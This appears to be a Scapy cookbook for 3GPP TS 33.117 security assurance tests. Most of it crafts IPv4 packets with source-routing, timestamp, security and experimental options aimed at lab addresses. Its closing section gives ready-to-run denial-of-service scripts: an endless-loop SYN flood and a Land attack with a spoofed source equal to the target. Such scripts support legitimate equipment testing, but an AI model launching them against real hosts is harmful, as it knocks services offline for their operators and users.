# security-assurance-test-cookbook-with-Scapy
For test cases of security assurance requirements defined in 3GPP TS 33.117.

# -------------------------------------------------------------------------------------------------------------------------------------------
# Cover IPv4 options in RFC791
# Create packet with NOP option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x01\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_NOP(), IPOption_EOL()])

# Create packet with LSR option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x83\x0b\x0c\x0a\x8d\x1a\xa0\x0a\x8d\x1a\xa0\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33", options=[IPOption_LSRR(pointer=12,routers=["1.2.3.4","5.6.7.8"]), IPOption_EOL()])
opt.do_build()

# Create packet with SSR option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x89\x0b\x0c\x0a\x8d\x1a\xa0\x0a\x8d\x1a\xa0\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_SSRR(pointer=12,routers=["1.2.3.4","5.6.7.8"]), IPOption_EOL()])
opt.do_build()

# Create packet with RR option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x07\x0b\x0c\x0a\x8d\x1a\xa0\x0a\x8d\x1a\xa0\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_RR(pointer=12,routers=["1.2.3.4","5.6.7.8"]), IPOption_EOL()])
opt.do_build()

# Create packet with SID option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x88\x04\x00\x01\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_Stream_Id(), IPOption_EOL()])
opt.do_build()

# Create packet with TS option in ICMP timestamp and with dst addr set to next hop switch
opt=IP(src="10.234.56.78",dst="10.141.24.1",options=b'\x44\x0c\x10\x03\x0a\x8d\x1a\xa0\x00\x00\x00\x01\x00')/ICMP(type=13)
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_Timestamp(), IPOption_EOL()])

# Cover IPv4 options in RFC1108
# Create packet with SEC option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x82\x0b\xd7\x88\x00\x00\xff\xff\xde\xad\xbe\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_Security(), IPOption_EOL()])

# Create packet with extended SEC option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x85\x07\x01\xde\xad\xbe\xef\x00')

# Cover CIPSO in draft IETF
# Create packet with CIPSO option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x86\x0a\xde\xad\xbe\xef\x01\x04\x00\xed\x00')

# Not defined Experimental Measurement(10), ENCODE(15), Unassigned(150), Experimental Access Control(142), IMI Traffic Descriptor(144), 
# Address Extension(147), Selective Directed Broadcast(149), Dynamic Packet State(151), Upstream Multicast Pkt.(152), Experimental Flow Control(205)

# Cover IPv4 options in RFC1063
# Create packet with MTU Probe option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x0b\x04\xde\xad\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_MTU_Probe(), IPOption_EOL()])

# Create packet with MTU reply option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x0c\x04\xde\xad\x00')
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_MTU_Reply(), IPOption_EOL()])

# Cover IPv4 options in RFC1385
# Create packet with Extended Internet Protocol 
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x91\x04\xde\xad\x00')

# Cover IPv4 options in RFC1393
# Create packet with TR option in ICMP traceroute
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x52\x0c\x00\x01\x00\x01\x00\x01\x0a\x8d\x1a\xa0\x00')/ICMP(type=30)
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_Traceroute(optclass=2), IPOption_EOL()])

# Cover IPv4 options by Ullmann IPv7
# Create packet with Address Extension option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_Address_Extension(), IPOption_EOL()])

# Cover IPv4 options in RFC2113
# Create packet with ERTRALT option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_Router_Alert(), IPOption_EOL()])

# Cover IPv4 options by Charles Bud Graff
# Create packet with SDB option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=[IPOption_SDBM(), IPOption_EOL()])

# Cover IPv4 options in RFC4782
# Create packet with QS option
opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x19\x08\x00\x00\x00\x00')

# Cover IPv4 options in RFC3692 and RFC4727
# Not defined EXP options(30, 94, 158, 222)
opt=IP(src="10.234.56.78",dst="224.0.0.254",options=b'\x1d\x08\x00\x00\x00\x00')

# Cover IPv6 extension header in RFC8200
# Create packet with IPv6 Hop-by-Hop Option
opt=IPv6ExtHdrHopByHop()

opt=IP(src="10.234.56.78",dst="10.96.106.33",options=b'\x97\x04\xde\xad\x00')

# -------------------------------------------------------------------------------------------------------------------------------------------
# SYN flooding attack
target_ip="10.96.106.82"
target_port=8002
app=Raw(b"X"*1024)
syn_flood=IP(dst=target_ip)/TCP(sport=RandShort(),dport=target_port,flags="S")/app
send(syn_flood, loop=1, verbose=0)


# Land attack with target set to IP address of target host
land=IP(src="10.96.106.82",dst="10.96.106.82")/TCP(sport=8002,dport=8002,flags="S")
sendp(land, count=5)
